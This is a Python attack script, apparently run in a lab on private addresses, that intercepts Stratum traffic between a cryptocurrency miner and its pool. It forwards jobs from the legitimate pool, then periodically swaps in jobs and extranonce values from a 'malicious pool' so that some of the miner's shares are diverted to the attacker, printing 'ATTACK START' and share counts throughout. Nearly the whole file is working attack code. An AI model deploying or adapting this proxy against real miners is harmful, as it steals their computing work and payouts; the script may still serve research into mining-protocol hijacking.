import json
import socket
import queue
import time
from threading import Thread

# ./ccminer -o stratum+tcp://172.16.44.21:3333 --userpass jack:3 -t 1 -D -P -a sha256d -i 25
# ./ccminer -o stratum+tcp://172.16.44.21:3333 --userpass jack:3 -t 1 -D -P -a sha256d -i 25
BUFSIZE = 10000
FLAG = 1

control_process = 0

diff_normal = b""
diff_self = b""
job_normal = b""
job_self = b""

data_extranonce1_normal = 0
data_extranonce2_size_normal = 0
data_extranonce1_self = 0
data_extranonce2_size_self = 0

count = 0


def bytes_to_dict(data_bytes):
    data_str = data_bytes.decode()
    data_dict = json.loads(data_str)
    return data_dict


def dict_to_bytes(data_dict):
    data_str = json.dumps(data_dict)
    data_bytes = data_str.encode(data_str)
    return data_bytes


s_normal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_normal.connect(("172.16.44.20", 3333))
s_self = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_self.connect(("172.16.44.21", 3333))

server_listen_3333 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_listen_3333.bind(("172.16.20.16", 3333))
server_listen_3333.listen(0)
a, b = server_listen_3333.accept()

print("+--------------------------------------------------------------------------+")
print("|                               ATTACK START                               |")
print("+--------------------------------------------------------------------------+")
print("============================================================================")
print("                    \033[1;34;48mSEND JOB FROM NORMAL POOL TO MINER\033[0m       ")
print("============================================================================")


def recv_from_miner():

    while True:
        global control_process, FLAG, data_extranonce1_normal, \
			data_extranonce2_size_normal, data_extranonce1_self, \
			data_extranonce2_size_self, count, job_normal, job_self

        data = a.recv(BUFSIZE)

        if data != "":

            data_2 = data.decode()
            data_list = data_2.split("\n")
            num_of_list = len(data_list)
            del data_list[num_of_list - 1]
            for message_recv_a in data_list:
                data_1 = json.loads(message_recv_a)
                message_recv_a = message_recv_a + "\n"
                message_recv_a = message_recv_a.encode()

                if data_1["method"] == "mining.subscribe":

                    s_normal.sendall(message_recv_a)
                    s_self.sendall(message_recv_a)

                    data_after_subscribe_normal = s_normal.recv(BUFSIZE)
                    data_after_subscribe_self = s_self.recv(BUFSIZE)

                    message_1 = bytes_to_dict(data_after_subscribe_normal)

                    data_from_result_1 = message_1["result"]
                    data_extranonce1_normal = data_from_result_1[1]
                    data_extranonce2_size_normal = data_from_result_1[2]

                    message_2 = bytes_to_dict(data_after_subscribe_self)
                    data_from_result_2 = message_2["result"]
                    data_extranonce1_self = data_from_result_2[1]
                    data_extranonce2_size_self = data_from_result_2[2]

                    a.send(data_after_subscribe_normal)

                    control_process = control_process + 1
                elif data_1["method"] == "mining.extranonce.subscribe":

                    s_normal.sendall(message_recv_a)
                    s_self.sendall(message_recv_a)
                elif data_1["method"] == "mining.submit":

                    if FLAG == 1:
                        count = count + 1
                        print("+--------------------------------------------------------------------------+")
                        print("|                       GOT THE SHARE FOR NORMAL POOL                      |")
                        print("+--------------------------------------------------------------------------+")
                        print("                         \033[1;32;48m NUMBER OF SHARES :\033[0m ", count)

                        s_normal.sendall(message_recv_a)
                        s_self.sendall(message_recv_a)
                        if count == 10:

                            print("============================================================================")
                            print("                   \033[1;35;48mSEND JOB FROM MALICIOUS POOL TO MINER\033[0m                    ")
                            print("============================================================================")
                            FLAG = 0
                            count = 0
                            message_extranonce_self = {
                                "id": None,
                                "method": "mining.set_extranonce",
                                "params": [data_extranonce1_self, data_extranonce2_size_self],
                            }
                            message_extranonce_self = json.dumps(message_extranonce_self) + "\n"
                            message_extranonce_self = message_extranonce_self.encode()
                            a.sendall(message_extranonce_self)

                    else:
                        count = count + 1

                        print("+--------------------------------------------------------------------------+")
                        print("|                     GOT THE SHARE FOR MALICIOUS POOL                     |")
                        print("+--------------------------------------------------------------------------+")
                        print("                         \033[1;32;48m NUMBER OF SHARES :\033[0m ", count)

                        s_self.sendall(message_recv_a)
                        s_normal.sendall(message_recv_a)
                        if count == 2:

                            print("============================================================================")
                            print("                      \033[1;34;48mSEND JOB FROM NORMAL POOL TO MINER\033[0m       ")
                            print("============================================================================")

                            FLAG = 1
                            count = 0
                            message_extranonce_normal = {
                                "id": None,
                                "method": "mining.set_extranonce",
                                "params": [data_extranonce1_normal, data_extranonce2_size_normal],
                            }
                            message_extranonce_normal = json.dumps(message_extranonce_normal) + "\n"
                            message_extranonce_normal = message_extranonce_normal.encode()
                            a.sendall(message_extranonce_normal)

                elif data_1["method"] == "mining.authorize":

                    s_normal.sendall(message_recv_a)
                    s_self.sendall(message_recv_a)

                    data_after_authorize_normal = s_normal.recv(BUFSIZE)

                    a.send(data_after_authorize_normal)

                    data_after_authorize_self = s_self.recv(BUFSIZE)
                    data_after_authorize_self_str = data_after_authorize_self.decode()
                    list_recv_self = data_after_authorize_self_str.split("\n")
                    num_of_list_self = len(list_recv_self)

                    del list_recv_self[num_of_list_self - 1]
                    data_after_authorize_self = list_recv_self[0].encode()
                    del list_recv_self[0]

                    for message_recv_self in list_recv_self:
                        message_recv_self_dict = json.loads(message_recv_self)
                        if message_recv_self_dict["method"] == "mining.set_difficulty":
                            diff_self = message_recv_self
                            diff_self = diff_self + "\n"
                            diff_self = diff_self.encode()
                        elif message_recv_self_dict["method"] == "mining.notify":
                            message_job = message_recv_self + "\n"
                            message_recv_self_bytes = message_job.encode()
                            job_self = message_recv_self_bytes
                    control_process = control_process + 1


def normal_pool():
    global control_process
    global diff_normal
    global job_normal
    while True:
        if control_process == 2:

            data_from_pool = s_normal.recv(BUFSIZE)
            data_from_pool_str = data_from_pool.decode()
            list_data_from_pool_str = data_from_pool_str.split("\n")
            num_of_list = len(list_data_from_pool_str)

            del list_data_from_pool_str[num_of_list - 1]
            for message_recv_normal in list_data_from_pool_str:

                message_recv_normal_dict = json.loads(message_recv_normal)

                if "method" in message_recv_normal_dict.keys():
                    if message_recv_normal_dict["method"] == "mining.set_difficulty":
                        diff_normal = message_recv_normal
                        diff_normal = diff_normal + "\n"
                        diff_normal = diff_normal.encode()
                    elif message_recv_normal_dict["method"] == "mining.notify":
                        message_job = message_recv_normal + "\n"
                        message_recv_normal_bytes = message_job.encode()
                        job_normal = message_recv_normal_bytes
                else:
                    message_recv_normal = message_recv_normal + "\n"
                    message_recv_normal = message_recv_normal.encode()
                    a.sendall(message_recv_normal)


def self_pool():
    while True:
        global control_process, diff_self, job_self, \
			FLAG_for_senddiff_normal, FLAG_for_sendjob_self, \
			FLAG_for_senddiff_self

        if control_process == 2:

            data_from_pool = s_self.recv(BUFSIZE)
            data_from_pool_str = data_from_pool.decode()
            list_data_from_pool_str = data_from_pool_str.split("\n")
            num_of_list = len(list_data_from_pool_str)

            del list_data_from_pool_str[num_of_list - 1]
            for message_recv_self in list_data_from_pool_str:

                message_recv_self_dict = json.loads(message_recv_self)
                if "method" in message_recv_self_dict.keys():
                    if message_recv_self_dict["method"] == "mining.set_difficulty":
                        diff_self = message_recv_self
                        diff_self = diff_self + "\n"
                        diff_self = diff_self.encode()
                    elif message_recv_self_dict["method"] == "mining.notify":
                        message_job = message_recv_self + "\n"
                        message_recv_self_bytes = message_job.encode()
                        job_self = message_recv_self_bytes
                else:
                    message_recv_self = message_recv_self + "\n"
                    message_recv_self = message_recv_self.encode()

                    a.sendall(message_recv_self)


def send_job():
    while True:
        global FLAG
        global diff_normal
        global diff_self
        global job_normal
        global job_self

        if FLAG == 1:
            if job_normal:
                if diff_normal != b"":
                    a.sendall(diff_normal)
                    time.sleep(15)
                a.sendall(job_normal)
                time.sleep(15)
        else:
            if job_self:
                if diff_self != b"":
                    a.sendall(diff_self)
                    time.sleep(15)
                a.sendall(job_self)
                time.sleep(15)


thread_01 = Thread(target=recv_from_miner)
thread_01.start()
thread_02 = Thread(target=normal_pool)
thread_02.start()
thread_03 = Thread(target=self_pool)
thread_03.start()
thread_04 = Thread(target=send_job)
thread_04.start()
